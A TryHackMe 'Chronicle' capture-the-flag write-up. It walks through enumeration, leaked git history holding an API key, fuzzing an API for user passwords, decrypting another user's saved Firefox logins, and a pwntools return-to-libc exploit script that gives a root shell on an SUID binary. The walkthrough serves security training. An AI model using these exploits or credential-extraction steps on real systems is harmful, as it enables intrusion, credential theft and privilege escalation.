---
title: "Chronicles"
date: 2024-03-21
layout: "simple"
categories: [TryHackme]
tags: [Binary exploitation, web]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---

# Introduction

Today we have a medium box called chronicle where we do some git forensics to get a key that gives us some user access into the machine and then doing some bit of browser forensics that enables us to move laterally as another user. Where we now find a binary that we can use to escalate our privileges. Here is the challenge [link](https://tryhackme.com/r/room/chronicle).

# Enumaration

So first of all we can start by doing some basic enumaration just to have a good idea of what our target looks like. First of all I like using `whatweb` to get some juicy information like, we find that our target is running on ubuntu and powered by apache and the apache version.

```shell
dexter@lab:~/lab/THM/chronicle$ whatweb http://10.10.202.252
http://10.10.202.252 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.202.252]
```

Next up we can then run an `Nmap` scan, where this helps us to scan for open portson our target.

```
dexter@lab:~/lab/THM/chronicle$ sudo nmap -sCV 10.10.202.252 -vv            
[sudo] password for dexter: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 05:56 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:56
Completed NSE at 05:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:56
Completed NSE at 05:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:56
Completed NSE at 05:56, 0.00s elapsed
Initiating Ping Scan at 05:56
Scanning 10.10.202.252 [4 ports]
Completed Ping Scan at 05:56, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:56
Completed Parallel DNS resolution of 1 host. at 05:56, 0.03s elapsed
Initiating SYN Stealth Scan at 05:56
Scanning 10.10.202.252 [1000 ports]
Discovered open port 22/tcp on 10.10.202.252
Discovered open port 80/tcp on 10.10.202.252
Discovered open port 8081/tcp on 10.10.202.252
Increasing send delay for 10.10.202.252 from 0 to 5 due to 284 out of 945 dropped probes since last increase.
Increasing send delay for 10.10.202.252 from 5 to 10 due to 11 out of 14 dropped probes since last increase.
Increasing send delay for 10.10.202.252 from 10 to 20 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.202.252 from 20 to 40 due to 11 out of 16 dropped probes since last increase.
Increasing send delay for 10.10.202.252 from 40 to 80 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.202.252 from 80 to 160 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.202.252 from 160 to 320 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.202.252 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.202.252 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Completed SYN Stealth Scan at 05:57, 67.97s elapsed (1000 total ports)
Initiating Service scan at 05:57
Scanning 3 services on 10.10.202.252
Completed Service scan at 05:57, 6.76s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.202.252.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 7.67s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.72s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.00s elapsed
Nmap scan report for 10.10.202.252
Host is up, received echo-reply ttl 63 (0.20s latency).
Scanned at 2024-02-15 05:56:33 EST for 83s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDELanAivcbXHH+RqBWDQUmT0TJPTzxJ4XOLkZ4hQYAYCUXQ25C24k6ijW6MnKiImF9m9CoMdlzXIAC/DYArGJu+q5L68V1SAaqtS5YljXGb517Qi4ixekjaLua9Z+Du00c0nGWC46WA+JCjI6UP8FlTyNONXJ4Wv8T7ZA6T8rTrWZWd6dSTIKaZaN8fsD31cIJMuX2whX8IczzwzFuxp2ucPLJ0IwpoiX3ubuqUz4kkNi8FI5T2hweqqygLPmdA8AySZrIbmC4AusmmHwSf99aUHXjZ5Z6fHbHAwH0dsGDFaDvHuVFEp4l1h9TpZiKghUllDx9+6eRyKprJMpfvXZ1
|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPxb2LHHqkJNa+RUETb+7kg2rLKG3IxkiOZnG3YP7R5hd2KqQC1eJL1UyHcBKdOYrFllM43rkqfDVSxtm2f/ivc=
|   256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPwYIfNblUpR0Hf/77s33mZq1OUXZD4jQacBQBwiLapr
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
8081/tcp open  http    syn-ack ttl 63 Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.40 seconds
           Raw packets sent: 1440 (63.336KB) | Rcvd: 1087 (44.016KB)
```

Nice we see we have three open ports including port 22(ssh), port 80(http), port 8081(http). Next we can fire up gobuster in order to enumarate for hidden directories. 

```
dexter@lab:~/lab/THM/chronicle$ gobuster dir -u http://10.10.202.252/ --wordlist /usr/share/dirb/wordlists/common.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.202.252/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 15]
/old                  (Status: 301) [Size: 312] [--> http://10.10.202.252/old/]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
Gobuster brings up results of directories with some status codes The [status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status#redirection_messages) 301 is a redirection message that tells us the requested resource has been changed permanently and that the new URL is given in the response. So in our exampl we are given the new URL.

# Exploitation

We can then visit the URL and we are met by some directory lists. 
![old_directory_listing](https://gist.github.com/assets/116626767/e97e2050-5755-4850-af5b-879a35d29016)

We can see we have a note.txt which we can can have a look, could be some developer note in there.

```shell
dexter@lab:~/lab/THM/chronicle$ curl 10.10.202.252/old/note.txt 
Everything has been moved to new directory and the webapp has been deployed
```
Not really much there right. Maybe we can get the whole directory into our machine using `wget`

```shell
dexter@lab:~/lab/THM/chronicle$ wget --recursive http://10.10.202.252/old/.git --continue
--2024-02-15 06:05:43--  http://10.10.202.252/old/.git
Connecting to 10.10.202.252:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://10.10.202.252/old/.git/ [following]
--2024-02-15 06:05:44--  http://10.10.202.252/old/.git/
Reusing existing connection to 10.10.202.252:80.
HTTP request sent, awaiting response... 200 OK
Length: 2891 (2.8K) [text/html]
Saving to: ‘10.10.202.252/old/.git’
```

## Git enumaration

We can check git logs now and see if commits and changes have been made before. We can do this by doing `git log -p` that will get all the commits and changes.

Going down the changes we see that we get something interesting here.

```shell
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:34:33 2021 +0000

    Finishing Things

diff --git a/app.py b/app.py
index 8c729fd..cbf47f5 100644
--- a/app.py
+++ b/app.py
@@ -22,11 +22,11 @@ def info(uname):
     print("OK")
     data=request.get_json(force=True)
     print(data)
-    if(data['key']=='abcd'):
+    if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
         if(uname=="admin"):
-            return '{"username":"admin","password":"password"}'
+            return '{"username":"admin","password":"password"}'     #Default Change them as required
         elif(uname=="someone"):
-            return '{"username":"someone","password":"someword"}'
+            return '{"username":"someone","password":"someword"}'   #Some other user
         else:
             return 'Invalid Username'
     else:
```

This looks like a key, but where do is the key required, Maybe something under port 8081.

![port_8081](https://gist.github.com/assets/116626767/49281124-7964-42a8-8188-149f58f97ccf)

And interesting enough we see a login page. 

![login_page](https://gist.github.com/assets/116626767/c7508db4-492a-45f7-826d-6d57bd49960a)

Interesting enough we see that we only the forgot password button works, we can try to fire up burp and maybe capture what the request does.

![burp_key_change](https://gist.github.com/assets/116626767/298cc3e0-69d3-49db-a356-b7692362adac)

Okay we see a request that uses a key and brings back an invalid username response, interesting yea, maybe we can try and fuzz to find possible users who use the the key or something, using `ffuf`. 

```shell
dexter@lab:~/lab/THM/chronicle/10.10.202.252/old$ ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -u http://10.10.202.252:8081/api/FUZZ -fw 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.202.252:8081/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
 :: Data             : {"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 2
________________________________________________

tommy                   [Status: 200, Size: 49, Words: 1, Lines: 1, Duration: 162ms]
someone                 [Status: 200, Size: 49, Words: 1, Lines: 1, Duration: 153ms]
??????                  [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 185ms]
?????                   [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 161ms]
:: Progress: [10000/10000] :: Job [1/1] :: 75 req/sec :: Duration: [0:01:45] :: Errors: 0 ::
```

Okay we get two possible usernames on the same and we can go back to burp and try and see if we get a sort of response using the following usernames.

![haha_burp_key_again](https://gist.github.com/assets/116626767/4b78e9b1-67e0-497a-9303-785a4ecd5980)

![also_burp_key_change](https://gist.github.com/assets/116626767/df566873-85f8-44fa-80a5-3feb84fd8598)

So now changing the usernames we can now get the passwords and now we can try and use ssh to connet to the machine.

```shell
dexter@lab:~/lab/THM/chronicle$ ssh tommy@10.10.202.252          
The authenticity of host '10.10.202.252 (10.10.202.252)' can't be established.
ED25519 key fingerprint is SHA256:B60EpPl2+Wzi63sLsxMDA4mwQ4W1Rc98XeO/0rlYvCM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.202.252' (ED25519) to the list of known hosts.
tommy@10.10.202.252's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Feb 15 11:34:19 UTC 2024

  System load:  0.09              Processes:           99
  Usage of /:   60.6% of 8.79GB   Users logged in:     0
  Memory usage: 41%               IP address for eth0: 10.10.202.252
  Swap usage:   0%


73 packages can be updated.
1 update is a security update.


*** System restart required ***
Last login: Fri Apr 16 14:05:02 2021 from 192.168.29.217
tommy@incognito:~$ ls
user.txt  web
tommy@incognito:~$ cat user.txt

```
We area able to connect and we find the user flag there. We then see we cannot really do much as user `tommy` so we might need to move laterally or try and escalate our privileges.

So moving into our home directory we actually find out that there is another user 

```shell
tommy@incognito:/home$ ls
carlJ  tommyV
```

From here we can send over `linpeas` to try and do some further enumaration on our target machine.

```shell
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/cert9.db: SQLite 3.x database, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/content-prefs.sqlite: SQLite 3.x database, user version 4, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/cookies.sqlite: SQLite 3.x database, user version 12, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/favicons.sqlite: SQLite 3.x database, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/formhistory.sqlite: SQLite 3.x database, user version 4, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/key4.db: SQLite 3.x database, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/permissions.sqlite: SQLite 3.x database, user version 11, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/places.sqlite: SQLite 3.x database, user version 53, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/protections.sqlite: SQLite 3.x database, user version 1, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/default/moz-extension+++dd7547ec-9377-4ab1-9ad9-c12821434fc2^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/storage.sqlite: SQLite 3.x database, user version 131075, last written using SQLite version 3032003
Found /home/carlJ/.mozilla/firefox/0ryxwn4c.default-release/webappsstore.sqlite: SQLite 3.x database, user version 2, last written using SQLite version 3032003
Found /var/lib/mlocate/mlocate.db: regular file, no read permission
```
This bit was very interesting to me as we see we have some browser profile, which means we could have some saved passwords. Let us dig through. 

```shell
tommy@incognito:/home/carlJ/.mozilla/firefox/0ryxwn4c.default-release$ cat logins.json 
{"nextId":2,"logins":[{"id":1,"hostname":"https://incognito.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECH3X/raFuZgKBAigmhgQUXDMnw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIe5VgWeABJZBBB7v9DPVoaXvgQm79RM1WuM","guid":"{32c188bb-6b46-45b4-b566-4b1d8e1c8f87}","encType":1,"timeCreated":1616952631202,"timeLastUsed":1616952631202,"timePasswordChanged":1616952631202,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

Interesting enough, looking at the logins json file we see that we have an encrypted username and an encrypted password. We could download this and use a neat decrypt script. To learn more about browser forensics I used my good friend's [article](https://05t3.github.io/posts/DCTF/#hidden-fox). Where he talks about how he was able to decrypt a profile to get some information that was stored in there, we can also use the same ideas to work around here.

---

Using firefox decrypt script we are actually able to crack our profile and get a username and password as so

```shell
dexter@lab:~/lab/THM/chronicle$ python3 firefox_decrypt.py /home/dexter/lab/THM/chronicle/10.10.202.252:8080/0ryxwn4c.default-release

2024-02-15 08:00:01,162 - WARNING - profile.ini not found in /home/dexter/lab/THM/chronicle/10.10.202.252:8080/0ryxwn4c.default-release
2024-02-15 08:00:01,164 - WARNING - Continuing and assuming '/home/dexter/lab/THM/chronicle/10.10.202.252:8080/0ryxwn4c.default-release' is a profile location

Primary Password for profile /home/dexter/lab/THM/chronicle/10.10.202.252:8080/0ryxwn4c.default-release: 

Website:   https://incognito.com
Username: 'dev'
Password: 'Pas$w0RD59247'
```
So no we can use that and ssh to the other user we saw earlier

```shell
dexter@lab:~/lab/THM/chronicle$ ssh carlJ@10.10.202.252
carlJ@10.10.202.252's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Feb 15 13:04:26 UTC 2024

  System load:  0.0               Processes:           101
  Usage of /:   60.9% of 8.79GB   Users logged in:     0
  Memory usage: 55%               IP address for eth0: 10.10.202.252
  Swap usage:   0%


73 packages can be updated.
1 update is a security update.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Sat Apr  3 20:24:03 2021 from 192.168.29.217
carlJ@incognito:~$ 
```

## Privilege escalation

So now looking around under the mailing directory we find ourselves a little binary. 

```shell
carlJ@incognito:~/mailing$ ls -la
total 20
drwx------ 2 carlJ carlJ 4096 Apr 16  2021 .
drwxr-xr-x 8 carlJ carlJ 4096 Jun 11  2021 ..
-rwsrwxr-x 1 root  root  8544 Apr  3  2021 smail
```

Our executable is owned by root, and this really is interesting since we can use some binary exploitation skills to enable us to get root. 

So here we notice we have something like a return to libc form of methodology, where we call the system function that already resides in the libc, since again the binary is dynamically allocated. 

To check for the libc being used by the binary we use `ldd` example

```shell
carlJ@incognito:~/mailing$ ldd smail
        linux-vdso.so.1 (0x00007ffff7ffa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
carlJ@incognito:~/mailing$ ldd smail
        linux-vdso.so.1 (0x00007ffff7ffa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
carlJ@incognito:~/mailing$ 
```
We notice that our libc does not change the base so that would mean that `ASLR` is off here. 

--- 
What is ASLR though? ASLR or address space layout randomization is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)

What ASLR does is randomize memory addresses making it more difficult to predict a target address. 

---

So in our case we don't have that on and so predicting target addresses is pretty simple, we can now predict where the system call is and actually call it and get a shell as root. 

```shell
from pwn import *

p = process('./smail')

base = 0x00007ffff79e2000 #0x00007f790800e000
sh =  base + 0x1b3e1a #0x19604f
system = base + 0x4f550  #0x4c920 

pop_rdi = 0x4007f3
ret = 0x400556

buffer = b'A' * 72

payload = buffer + p64(ret) + p64(pop_rdi) + p64(sh) + p64(system) + p64(0x0)

p.clean()
p.sendline(b"2")
p.sendline(payload)
p.interactive()
```
And we are root. 

```shell
carlJ@incognito:~/mailing$ python3 a.py 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/carlJ/.cache/.pwntools-cache-3.6/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.4.0)
[+] Starting local process './smail': pid 10141
[*] Switching to interactive mode
Write your signature...
Changed
$ id
uid=0(root) gid=1002(carlJ) groups=1002(carlJ)
```
